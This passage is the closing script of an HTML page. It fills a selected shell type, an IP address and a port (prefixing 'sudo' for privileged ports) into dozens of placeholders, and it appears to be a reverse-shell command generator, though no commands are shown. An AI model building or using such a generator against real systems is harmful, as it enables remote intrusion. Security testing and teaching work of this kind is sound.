const thirtyfour = document.querySelector('.shell');

thirtyfour.addEventListener('change', (event) => {
  const thirtyfour = document.querySelector('.thirtyfour');
  thirtyfour.textContent = `  ${event.target.value}`;
});

</script>

 <script>
const thirtyfive = document.querySelector('.shell');

thirtyfive.addEventListener('change', (event) => {
  const thirtyfive = document.querySelector('.thirtyfive');
  thirtyfive.textContent = `  ${event.target.value}`;
});

</script>

 <script>
const thirtysix = document.querySelector('.shell');

thirtysix.addEventListener('change', (event) => {
  const thirtysix = document.querySelector('.thirtysix');
  thirtysix.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const thirtyseven = document.querySelector('.shell');

thirtyseven.addEventListener('change', (event) => {
  const thirtyseven = document.querySelector('.thirtyseven');
  thirtyseven.textContent = `  ${event.target.value}`;
});

</script>
 <script>
const thirtyeight = document.querySelector('.shell');

thirtyeight.addEventListener('change', (event) => {
  const thirtyeight = document.querySelector('.thirtyeight');
  thirtyeight.textContent = `  ${event.target.value}`;
});

</script>
 
 <script>
const thirtynine = document.querySelector('.shell');

thirtynine.addEventListener('change', (event) => {
  const thirtynine = document.querySelector('.thirtynine');
  thirtynine.textContent = `  ${event.target.value}`;
});


</script>

 
 <script>
const fourtyone = document.querySelector('.shell');

fourtyone.addEventListener('change', (event) => {
  const fourtyone = document.querySelector('.fourtyone');
  fourtyone.textContent = `  ${event.target.value}`;
});


</script>
<script>
const fourty = document.querySelector('.shell');

fourty.addEventListener('change', (event) => {
  const fourty = document.querySelector('.fourty');
  fourty.textContent = `  ${event.target.value}`;
});


</script>
     <script>
// Side navigation
function w3_open() {
  var x = document.getElementById("mySidebar");
  x.style.width = "100%";
  x.style.fontSize = "40px";
  x.style.paddingTop = "10%";
  x.style.display = "block";
}
function w3_close() {
  document.getElementById("mySidebar").style.display = "none";
}

// Tabs
function openCity(evt, cityName) {
  var i,x,tablinks;
  var x = document.getElementsByClassName("city");
  for (i = 0; i < x.length; i++) {
    x[i].style.display = "none";
  }
  var activebtn = document.getElementsByClassName("testbtn");
  for (i = 0; i < x.length; i++) {
    activebtn[i].className = activebtn[i].className.replace(" w3-indigo", "");
  }
  document.getElementById(cityName).style.display = "block";
  evt.currentTarget.className += " w3-indigo";
}

 
var mybtn = document.getElementsByClassName("testbtn")[0];
mybtn.click();
 
 //vert tabs
 function City(evt, cityName) {
  var i, tabcontent, tablinks;
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i = 0; i < tabcontent.length; i++) {
    tabcontent[i].style.display = "none";
  }
  tablinks = document.getElementsByClassName("tablinks");
  for (i = 0; i < tablinks.length; i++) {
    tablinks[i].className = tablinks[i].className.replace(" w3-indigo", "");
  }
  document.getElementById(cityName).style.display = "block";
  evt.currentTarget.className += " w3-indigo";
}
  

// Get the element with id="defaultOpen" and click on it
document.getElementById("defaultOpen").click();
document.getElementById("openagain").click();
 document.getElementById("openonceagain").click();
 
 //for listeber
 function listener(evt, cityName) {
  var i,m,tablinks;
  var m = document.getElementsByClassName("city1");
  for (i = 0; i < m.length; i++) {
    m[i].style.display = "none";
  }
  var activebtn = document.getElementsByClassName("testbuttn");
  for (i = 0; i < m.length; i++) {
    activebtn[i].className = activebtn[i].className.replace(" w3-indigo", "");
  }
  document.getElementById(cityName).style.display = "block";
  evt.currentTarget.className += " w3-indigo";
}

  
var mybuttn = document.getElementsByClassName("testbuttn")[0];
mybuttn.click();
 


 filterSelection("all")
function filterSelection(c) {
  var x, i;
  x = document.getElementsByClassName("filterDiv");
  
  if (c == "all") c = "";
  // Add the "show" class (display:block) to the filtered elements, and remove the "show" class from the elements that are not selected
  for (i = 0; i < x.length; i++) {
    w3RemoveClass(x[i], "show");
    if (x[i].className.indexOf(c) > -1) w3AddClass(x[i], "show");
  }
  
 
  
  
}

// Show filtered elements
function w3AddClass(element, name) {
  var i, arr1, arr2;
  arr1 = element.className.split(" ");
  arr2 = name.split(" ");
  for (i = 0; i < arr2.length; i++) {
    if (arr1.indexOf(arr2[i]) == -1) {
      element.className += " " + arr2[i];
    }
  }
}

// Hide elements that are not selected
function w3RemoveClass(element, name) {
  var i, arr1, arr2;
  arr1 = element.className.split(" ");
  arr2 = name.split(" ");
  for (i = 0; i < arr2.length; i++) {
    while (arr1.indexOf(arr2[i]) > -1) {
      arr1.splice(arr1.indexOf(arr2[i]), 1);
    }
  }
  element.className = arr1.join(" ");
}

// Add active class to the current control button (highlight it)
var btnContainer = document.getElementById("myBtnContainer");
var btns = btnContainer.getElementsByClassName("btn");
for (var i = 0; i < btns.length; i++) {
  btns[i].addEventListener("click", function() {
    var current = document.getElementsByClassName("active");
    current[0].className = current[0].className.replace(" active", "");
    this.className += " active";
  });
}



function myFunction() {
// Get the value of the input field with id="numb"
  let x = document.getElementById("numbie2").value;
  // If x is Not a Number or less than one or greater than 10
   
  textsec =x;
  
 
 document.getElementById("demo").innerHTML = textsec;
  document.getElementById("ip one").innerHTML = textsec;
  document.getElementById("ip two").innerHTML = textsec;
    document.getElementById("ip three").innerHTML = textsec;
      document.getElementById("ip four").innerHTML = textsec;
        document.getElementById("ip five").innerHTML = textsec;
          document.getElementById("ip six").innerHTML = textsec;
      document.getElementById("ip seven").innerHTML = textsec;
       document.getElementById("ip eight").innerHTML = textsec;
         document.getElementById("ip nine").innerHTML = textsec;
           document.getElementById("ip ten").innerHTML = textsec;
             document.getElementById("ip eleven").innerHTML = textsec;
           document.getElementById("ip twelve").innerHTML = textsec;
             document.getElementById("ip thirteen").innerHTML = textsec;
               document.getElementById("ip fourteen").innerHTML = textsec;
           document.getElementById("ip fifteen").innerHTML = textsec;
             document.getElementById("ip sixteen").innerHTML = textsec;
           
                 document.getElementById("ip seventeen").innerHTML = textsec;
                   document.getElementById("ip eighteen").innerHTML = textsec;
                      document.getElementById("ip nineteen").innerHTML = textsec;
                   
                      document.getElementById("ip twenty").innerHTML = textsec;
                   document.getElementById("ip twenty one").innerHTML = textsec;
                   document.getElementById("ip twenty two").innerHTML = textsec;
                   document.getElementById("ip twenty three").innerHTML = textsec;
                   document.getElementById("ip twenty four").innerHTML = textsec;
                   document.getElementById("ip twenty five").innerHTML = textsec;
                   document.getElementById("ip twenty six").innerHTML = textsec;
                   document.getElementById("ip twenty seven").innerHTML = textsec;
                   document.getElementById("ip twenty eight").innerHTML = textsec;
                   document.getElementById("ip twenty nine").innerHTML = textsec;
 
 document.getElementById("ip thirty").innerHTML = textsec;
 document.getElementById("ip thirty one").innerHTML = textsec;
 document.getElementById("ip thirty two").innerHTML = textsec;
 document.getElementById("ip thirty three").innerHTML = textsec;
 document.getElementById("ip thirty four").innerHTML = textsec;
 document.getElementById("ip thirty five").innerHTML = textsec;
 document.getElementById("ip thirty six").innerHTML = textsec;
 document.getElementById("ip thirty seven").innerHTML = textsec;
 document.getElementById("ip thirty eight").innerHTML = textsec;
 document.getElementById("ip thirty nine").innerHTML = textsec;
 document.getElementById("ip fourty").innerHTML = textsec;
 document.getElementById("ip fourty one").innerHTML = textsec;
 document.getElementById("ip fourty two").innerHTML = textsec;
 document.getElementById("ip fourty three").innerHTML = textsec;
 document.getElementById("ip fourty four").innerHTML = textsec;
 document.getElementById("ip fourty five").innerHTML = textsec;

 document.getElementById("ip fourty six").innerHTML = textsec;
  document.getElementById("ip fourty seven").innerHTML = textsec;
   document.getElementById("ip fourty eight").innerHTML = textsec;

 document.getElementById("ip fourty nine").innerHTML = textsec;
 document.getElementById("ip fifty").innerHTML = textsec;
 document.getElementById("ip fifty one").innerHTML = textsec;

 document.getElementById("ip fifty two").innerHTML = textsec;
 document.getElementById("ip fifty three").innerHTML = textsec;
 document.getElementById("ip fifty four").innerHTML = textsec;
 document.getElementById("ip fifty five").innerHTML = textsec;
 document.getElementById("ip fifty six").innerHTML = textsec;
 document.getElementById("ip fifty seven").innerHTML = textsec;
 document.getElementById("ip fifty eight").innerHTML = textsec;
 document.getElementById("ip fifty nine").innerHTML = textsec;
 document.getElementById("ip sixty").innerHTML = textsec;
 document.getElementById("ip sixty one").innerHTML = textsec;
 document.getElementById("ip sixty two").innerHTML = textsec;
  document.getElementById("ip sixty three").innerHTML = textsec;
   document.getElementById("ip sixty four").innerHTML = textsec;
    document.getElementById("ip sixty five").innerHTML = textsec;
     document.getElementById("ip sixty six").innerHTML = textsec;
      document.getElementById("ip sixty seven").innerHTML = textsec;
       document.getElementById("ip sixty eight").innerHTML = textsec;
        document.getElementById("ip sixty nine").innerHTML = textsec;
        document.getElementById("ip seventy").innerHTML = textsec;
         document.getElementById("ip seventy one").innerHTML = textsec;
         
         document.getElementById("ip seventy two").innerHTML = textsec;
              document.getElementById("ip seventy three").innerHTML = textsec;
                   document.getElementById("ip seventy four").innerHTML = textsec;
                        document.getElementById("ip seventy five").innerHTML = textsec;
                         
}



function secFunction() {


  // Get the value of the input field with id="numb"
  let x = document.getElementById("numb").value;
  let y="sudo ";
  // If x is Not a Number or less than one or greater than 10
  let text;
  if (isNaN(x) || x<0)
  {
    text = " Input not valid ";
  }
  else if(x < 1024  || x > 49151)
  {
  document.getElementById("other cases").innerHTML=y;
  text=x;
  }
  else
  {
  text= x;
  }
 document.getElementById("port hundred").innerHTML = text;
                     document.getElementById("port hundred one").innerHTML = text;
 document.getElementById("input port").innerHTML = text;
  document.getElementById("port again").innerHTML = text;
  document.getElementById("port once again").innerHTML = text;
    document.getElementById("port one").innerHTML = text;
    document.getElementById("port two").innerHTML = text;
    document.getElementById("port three").innerHTML = text;
    document.getElementById("port four").innerHTML = text;
    document.getElementById("port five").innerHTML = text;
    document.getElementById("port six").innerHTML = text;
    document.getElementById("port seven").innerHTML = text;
    document.getElementById("port eight").innerHTML = text;
    document.getElementById("port nine").innerHTML = text;
    document.getElementById("port ten").innerHTML = text;
    document.getElementById("port eleven").innerHTML = text;
    document.getElementById("port twelve").innerHTML = text;
    document.getElementById("port thirteen").innerHTML = text;
    document.getElementById("port fourteen").innerHTML = text;
    document.getElementById("port fifteen").innerHTML = text;
    document.getElementById("port sixteen").innerHTML = text;
    document.getElementById("port seventeen").innerHTML = text;
    document.getElementById("port eighteen").innerHTML = text;
       document.getElementById("port nineteen").innerHTML = text;
                   
                      document.getElementById("port twenty").innerHTML = text;
                   document.getElementById("port twenty one").innerHTML = text;
                   document.getElementById("port twenty two").innerHTML = text;
                   document.getElementById("port twenty three").innerHTML = text;
                   document.getElementById("port twenty four").innerHTML = text;
                   document.getElementById("port twenty five").innerHTML = text;
                   document.getElementById("port twenty six").innerHTML = text;
                   document.getElementById("port twenty seven").innerHTML = text;
                   document.getElementById("port twenty eight").innerHTML = text;
                   document.getElementById("port twenty nine").innerHTML = text;
 
 document.getElementById("port thirty").innerHTML = text;
 document.getElementById("port thirty one").innerHTML = text;
 document.getElementById("port thirty two").innerHTML = text;
 document.getElementById("port thirty three").innerHTML = text;
 document.getElementById("port thirty four").innerHTML = text;
 document.getElementById("port thirty five").innerHTML = text;
 document.getElementById("port thirty six").innerHTML = text;
 document.getElementById("port thirty seven").innerHTML = text;
 document.getElementById("port thirty eight").innerHTML = text;
 document.getElementById("port thirty nine").innerHTML = text;
 document.getElementById("port fourty").innerHTML = text;
 document.getElementById("port fourty one").innerHTML = text;
 document.getElementById("port fourty two").innerHTML = text;
 document.getElementById("port fourty three").innerHTML = text;
 document.getElementById("port fourty four").innerHTML = text;
 document.getElementById("port fourty five").innerHTML = text;

 document.getElementById("port fourty six").innerHTML = text;
  document.getElementById("port fourty seven").innerHTML = text;
   document.getElementById("port fourty eight").innerHTML = text;

 document.getElementById("port fourty nine").innerHTML = text;
 document.getElementById("port fifty").innerHTML = text;
 document.getElementById("port fifty one").innerHTML = text;

 document.getElementById("port fifty two").innerHTML = text;
 document.getElementById("port fifty three").innerHTML = text;
 document.getElementById("port fifty four").innerHTML = text;
 document.getElementById("port fifty five").innerHTML = text;
 document.getElementById("port fifty six").innerHTML = text;
 document.getElementById("port fifty seven").innerHTML = text;
 document.getElementById("port fifty eight").innerHTML = text;
 document.getElementById("port fifty nine").innerHTML = text;
 document.getElementById("port sixty").innerHTML = text;
 document.getElementById("port sixty one").innerHTML = text;
 document.getElementById("port sixty two").innerHTML = text;
  document.getElementById("port sixty three").innerHTML = text;
   document.getElementById("port sixty four").innerHTML = text;
    document.getElementById("port sixty five").innerHTML = text;
     document.getElementById("port sixty six").innerHTML = text;
      document.getElementById("port sixty seven").innerHTML = text;
       document.getElementById("port sixty eight").innerHTML = text;
        document.getElementById("port sixty nine").innerHTML = text;
         document.getElementById("port seventy").innerHTML = text;
         document.getElementById("port seventy one").innerHTML = text;
         
         document.getElementById("port seventy two").innerHTML = text;
              document.getElementById("port seventy three").innerHTML = text;
                   document.getElementById("port seventy four").innerHTML = text;
           document.getElementById("port seventy five").innerHTML = text;
                    
}


</script>
</script>

</body>
</html>

